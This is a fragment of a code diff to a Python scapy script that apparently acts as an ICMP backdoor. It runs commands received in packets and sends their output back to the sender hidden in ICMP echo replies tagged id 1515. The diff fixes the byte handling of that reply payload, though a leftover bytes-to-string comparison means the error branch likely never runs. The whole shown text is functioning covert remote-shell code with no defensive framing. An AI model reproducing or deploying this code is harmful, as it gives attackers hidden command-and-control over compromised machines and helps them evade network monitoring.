@@ -41,15 +41,15 @@ def packet_callback(packet):
         os.close(child_conn)
         process.communicate()
 
-        output = output.decode('cp866').strip()
-        error = error.decode('cp866').strip()
-        print(output)
-        print(error)
+        string_output = output.decode('cp866').strip()
+        string_error = error.decode('cp866').strip()
+        print(string_output)
+        print(string_error)
         if output == '':
-            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
+            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + b"\n")
             send(reply_packet, verbose=False)
         else:
-            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output + "\n")
+            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output + b"\n")
             send(reply_packet, verbose=False)
 
 
